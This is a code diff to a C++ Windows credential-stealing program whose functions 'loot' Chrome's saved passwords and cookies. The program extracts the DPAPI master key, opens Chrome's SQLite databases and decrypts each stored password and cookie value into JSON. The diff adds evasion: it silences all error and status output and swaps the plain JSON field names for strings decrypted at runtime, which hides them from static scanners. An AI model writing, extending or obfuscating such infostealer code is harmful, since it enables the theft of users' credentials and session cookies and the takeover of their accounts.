@@ -21,9 +21,16 @@ void decryptWithAesGcm256(const unsigned char* masterKey,
 void initializeSodiumLibrary();
 json getPasswordRowData(sqlite3_stmt* statement, const unsigned char* masterKey);
 json getCookieRowData(sqlite3_stmt* statement, const unsigned char* masterKey);
+void initializePasswordProperties();
+void initializeCookieProperties();
+string decryptToGetStr(int i);
+// string get_decryptFailedMsg();
 
 HMODULE hSqlModule = LoadLibrary(TEXT("../libs/sqlite3/sqlite3.dll"));
 extern HMODULE hSodiumModule;
+
+json passwordProperties;
+json cookieProperties;
 
 // Define sqlite3 functions
 typedef int (*sqlite3_open_t) (const char *filename, sqlite3 **ppDb);
@@ -81,7 +88,7 @@ void getMasterKey(unsigned char* masterKey, string userName) {
 	delete[] dpapiEncrypted;
 
 	if (!decryptSuccess) {
-		cout << "Failed to decrypt" << endl;
+		// cout << "Failed to decrypt" << endl;
 		return;
 	}
 
@@ -107,6 +114,7 @@ json lootChromePasswords(const unsigned char* masterKey, string userName) {
 
 	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
 	initializeSodiumLibrary();
+	initializePasswordProperties();
 
 	// Get dbFile path
 	string loginDataPath = getLoginDataPath(userName);
@@ -123,12 +131,13 @@ json lootChromePasswords(const unsigned char* masterKey, string userName) {
 	errorCode = sqlite3_open_(dbFile, &db);
 
 	if (errorCode) {
-		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
+		// fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
 		json error = "Error";
 		return error;
-	} else {
-		fprintf(stderr, "Opened database successfully\n");
 	}
+	// else {
+	// 	fprintf(stderr, "Opened database successfully\n");
+	// }
 
 	// Create SQL statement
 	// Source: https://stackoverflow.com/questions/27383724/sqlite3-prepare-v2-sqlite3-exec
@@ -159,7 +168,7 @@ json lootChromePasswords(const unsigned char* masterKey, string userName) {
 	sqlite3_stmt* statement;
 
 	if (sqlite3_prepare_v2_(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
-    cout << "Prepare failure: %s\n" << sqlite3_errmsg_(db) << endl;
+    // cout << "Prepare failure: %s\n" << sqlite3_errmsg_(db) << endl;
 		json error = "Error";
 		return error;
 	}
@@ -173,7 +182,7 @@ json lootChromePasswords(const unsigned char* masterKey, string userName) {
 	}
 
 	if (stepResult != SQLITE_DONE) {
-    cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
+    // cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
 	}
 
 	sqlite3_finalize_(statement);
@@ -186,6 +195,7 @@ json lootChromePasswords(const unsigned char* masterKey, string userName) {
 json lootChromeCookies(const unsigned char* masterKey, string userName) {
 	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
 	initializeSodiumLibrary();
+	initializeCookieProperties();
 	json lootResult = json::array();
 
 	// Get dbFile path
@@ -203,12 +213,13 @@ json lootChromeCookies(const unsigned char* masterKey, string userName) {
 	errorCode = sqlite3_open_(dbFile, &db);
 
 	if (errorCode) {
-		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
+		// fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
 		json j = "error";
 		return j;
-	} else {
-		fprintf(stderr, "Opened database successfully\n");
 	}
+	// else {
+	// 	fprintf(stderr, "Opened database successfully\n");
+	// }
 
 	// Extract encrypted statementStr
 	Crypto crypto = Crypto();
@@ -234,7 +245,7 @@ json lootChromeCookies(const unsigned char* masterKey, string userName) {
 	sqlite3_stmt* statement;
 
 	if (sqlite3_prepare_v2_(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
-    cout << "Prepare failure: " << sqlite3_errmsg_(db) << endl;
+    // cout << "Prepare failure: " << sqlite3_errmsg_(db) << endl;
 		json j = "error";
 		return j;
 	}
@@ -246,9 +257,9 @@ json lootChromeCookies(const unsigned char* masterKey, string userName) {
 		lootResult.push_back(rowData);
 	}
 
-	if (stepResult != SQLITE_DONE) {
-    cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
-	}
+	// if (stepResult != SQLITE_DONE) {
+  //   cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
+	// }
 
 	sqlite3_finalize_(statement);
   sqlite3_close_(db);
@@ -461,9 +472,11 @@ void decryptWithAesGcm256(const unsigned char* masterKey,
 		(const unsigned char*) masterKey
 	);
 
-	if (decryptFailed) {
-		cout << "crypto_aead_aes256gcm_decrypt failed" << endl;
-	}
+	// if (decryptFailed) {
+	// 	// "crypto_aead_aes256gcm_decrypt failed"
+	// 	string errorMsg = get_decryptFailedMsg();
+	// 	cout << errorMsg << endl;
+	// }
 
 	decrypted[decryptedLen] = '\0';
 }
@@ -480,11 +493,12 @@ void initializeSodiumLibrary() {
 
 	// Initialize sodium library, used for crypto_aead_aes256gcm_decrypt
 	if (sodium_init() < 0) {
-		cout << "Unable to initialize sodium, will be unable to use crypto_aead_aes256gcm_decrypt." << endl;
+		// cout << "Unable to initialize sodium, will be unable to use crypto_aead_aes256gcm_decrypt." << endl;
+		abort();
   }
 
 	if (crypto_aead_aes256gcm_is_available() == 0) {
-		cout << "Unable to use crypto_aead_aes256gcm on this CPU." << endl;
+		// cout << "Unable to use crypto_aead_aes256gcm on this CPU." << endl;
     abort(); /* Not available on this CPU */
 	}
 }
@@ -504,9 +518,9 @@ json getPasswordRowData(sqlite3_stmt* statement, const unsigned char* masterKey)
 	string passwordValue(reinterpret_cast<char*>(decryptedPassword));
 
 	json rowData = {
-		{"original_url", originalUrl},
-		{"username_value", usernameValue},
-		{"password_value", passwordValue}
+		{passwordProperties[0], originalUrl},
+		{passwordProperties[1], usernameValue},
+		{passwordProperties[2], passwordValue}
 	};
 
 	return rowData;
@@ -534,13 +548,119 @@ json getCookieRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {
 	string source_port_s(reinterpret_cast<char*>(source_port));
 
 	json rowData = {
-		{"host_key", host_key_s},
-		{"name", name_s},
-		{"decrypted_value", decrypted_value_s},
-		{"path", path_s},
-		{"expires_utc", expires_utc_s},
-		{"source_port", source_port_s}
+		{cookieProperties[0], host_key_s},
+		{cookieProperties[1], name_s},
+		{cookieProperties[2], decrypted_value_s},
+		{cookieProperties[3], path_s},
+		{cookieProperties[4], expires_utc_s},
+		{cookieProperties[5], source_port_s}
 	};
 
 	return rowData;
 }
+
+void initializeCookieProperties() {
+	string hostKeyStr = decryptToGetStr(3); // "host_key"
+	string nameStr = decryptToGetStr(4); // "name"
+	string decryptedValueStr = decryptToGetStr(5); // "decrypted_value"
+	string pathStr = decryptToGetStr(6); // "path"
+	string expiresUtcStr = decryptToGetStr(7); // "expires_utc"
+	string sourcePortStr = decryptToGetStr(8); // "source_port"
+
+	cookieProperties = { hostKeyStr, nameStr, decryptedValueStr, pathStr, expiresUtcStr, sourcePortStr };
+}
+
+void initializePasswordProperties() {
+	string originalUrlStr = decryptToGetStr(0); // "original_url"
+	string usernameValueStr = decryptToGetStr(1); // "username_value"
+	string passwordValueStr = decryptToGetStr(2); // "password_value"
+
+	passwordProperties = { originalUrlStr, usernameValueStr, passwordValueStr };
+}
+
+// 0 = "original_url"
+// 1 = "username_value"
+// 2 = "password_value"
+// 3 = "host_key"
+// 4 = "name"
+// 5 = "decrypted_value"
+// 6 = "path"
+// 7 = "expires_utc"
+// 8 = "source_port"
+string decryptToGetStr(int i) {
+	Crypto crypto = Crypto();
+
+	const int decryptedLen[9] = { 13, 15, 15, 9, 5, 16, 5, 12, 12 };
+	unsigned char nonce[][NONCE_BYTES + 1] = {
+		"\x43\xd3\x81\xe5\xf3\x8e\x99\x45\x2a\xab\x8c\xec\x2f\x51\x3e\xc8\x47\x4f\xe9\xd9\xef\x4d\x5d\x72",
+
+		"\xfe\x0c\x76\x4b\xe2\xd1\x8d\x65\xc8\xe8\xac\xc2\x03\xb5\x12\x05\x0e\xd3\xaa\xeb\xf5\x4b\xbb\x7e",
+
+		"\xa2\x68\x89\xf7\xbd\xc0\x97\x19\xc1\x0d\xa5\xc1\x91\xdd\x86\x89\xd1\xef\x6b\x57\x9e\xf8\x20\x94",
+
+		"\x3e\x8e\x7c\xde\xc3\xb5\xac\x85\xcb\xed\xcb\x2d\xd1\x90\xdd\xe0\xee\x6e\x19\x5c\x4c\x54\xc8\xfe",
+
+		"\xf1\x55\xf7\x7c\x98\x24\x77\xcc\xdc\xc1\x48\xcd\xb7\x1c\x24\xbc\x27\xc5\xee\xe0\x6c\x0e\x72\xad",
+
+		"\xdf\xb9\xc5\xff\x4a\xf1\xb8\x28\x30\x7f\x83\x36\x07\x75\x07\xca\xe9\xf1\xe9\xfd\xb4\x60\x57\x21",
+
+		"\x22\x00\x92\xa5\xff\x95\x5b\xb3\x02\xbe\xa8\xd6\x68\x18\x91\x22\x22\xae\x46\xb4\x25\xa2\xdb\x95",
+
+		"\x46\xe5\x3e\x39\x7f\x43\x24\xb9\xec\x2d\x22\x74\xd3\x9d\x55\x85\x94\xbd\x31\x31\x36\xe5\xe0\xae",
+
+		"\x1b\x04\x0e\xc4\x46\x18\xb7\xc8\x50\x2f\xfd\xf5\x63\x84\x65\x18\xe3\xd9\x40\xc8\x98\x5b\xb1\xa4"
+	};
+
+	int maxDecryptedLen = 16;
+	unsigned char encrypted[][maxDecryptedLen + MAC_BYTES] = {
+		"\x35\x67\x64\xd5\xbf\x39\xa0\xa5\xe9\x4a\x6b\xe8\x36\xaa\x98\x9f\xa2\x38\xe0\xed\xca\x21\xe5\x53\xd5\xdb\x09\x9f",
+
+		"\x63\x4a\x21\x91\x62\x4a\xad\x4e\xe7\xac\x57\x0d\xa2\x93\x35\x5a\x35\xb8\xdd\xba\x3e\x2e\x45\xcd\x8d\x63\xb5\xf1\x9f\x9d",
+
+		"\x13\x90\xaf\xd6\x37\xce\xce\xb3\x1f\x03\x5f\xae\xd9\x70\xdc\x5f\x87\x2f\x52\x49\xe2\xe7\x83\x5d\x03\xe1\xdb\xaf\x3e\x3b",
+
+		"\xe3\x85\x40\x08\x58\x11\x8a\x60\x1a\xb4\x73\x8d\xda\x40\x77\xca\xd8\xf9\x48\xa3\xa1\xe3\x59\xa3",
+
+		"\xa4\xd3\xc2\xcc\xb4\xdb\x71\xd6\xad\x1f\x7e\xa4\xd8\x4e\x6b\xe2\x5a\xc8\x93\x48",
+
+		"\xb6\x2c\xc4\x3c\xf3\xb1\xa7\xc5\xce\x24\x64\x36\x4f\x82\x22\xb6\x16\x24\xcb\xfc\xb9\xbf\x35\xc0\xb0\x53\x2f\x82\x42\x5a\x11",
+
+		"\x43\xae\x7e\x60\x46\x35\x14\xd8\x44\xc1\xd1\x11\x91\x31\xd0\x3b\x07\x99\x57\x79",
+
+		"\x2e\x49\x95\xb1\xca\x5e\xaa\xa3\x57\xef\xa6\x97\x19\x98\x7b\x64\x4d\x7c\x9f\xd2\x60\xe3\x6c\x48\xfb\xf9\xc2",
+
+		"\xc0\x53\x61\xe9\xbd\xf9\x75\x99\x77\xf2\x31\xeb\xb9\xaf\xa7\x87\x7e\xbe\xca\x76\x0f\x90\x46\x3b\x08\x9f\x0a"
+	};
+
+	unsigned char decrypted[decryptedLen[i]];
+
+	crypto.symmDecrypt(decrypted, nonce[i], encrypted[i], decryptedLen[i] - 1 + MAC_BYTES);
+	decrypted[decryptedLen[i] - 1] = '\0';
+
+	string str(reinterpret_cast<char*>(decrypted));
+	return str;
+}
+
+// string get_decryptFailedMsg() {
+// 	// Decrypt to get "crypto_aead_aes256gcm_decrypt failed"
+//
+// 	Crypto crypto = Crypto();
+//
+// 	int decryptedLen = 37;
+// 	unsigned char decrypted[decryptedLen];
+//
+// 	unsigned char nonce[] = "\x55\x4a\x95\xca\x71\x35\x68\x93\xd2\x43\x38\xee"
+// 	"\x51\x95\xdf\xfe\xaa\x60\x6c\xa8\x02\x37\xe8\x3f";
+//
+//  	unsigned char encrypted[] = "\x6d\x94\x26\xed\x3b\xa5\x6c\xa8\x60\x36\xad"
+// 	"\xa8\xe2\x8d\xea\x2c\x28\xc4\xf4\xc3\xe3\x38\x62\x59\x77\x7f\x05\x5f\x51"
+// 	"\x8f\xc0\xe3\x2c\x79\xf9\x44\xb7\xfc\x37\x1f\x22\x57\x38\xd8\x3c\x25\xdd"
+// 	"\xc9\x7c\x06\x52\xfc";
+//
+// 	crypto.symmDecrypt(decrypted, nonce, encrypted, decryptedLen - 1 + MAC_BYTES);
+// 	decrypted[decryptedLen - 1] = '\0';
+//
+// 	string str(reinterpret_cast<char*>(decrypted));
+//
+// 	return str;
+// }
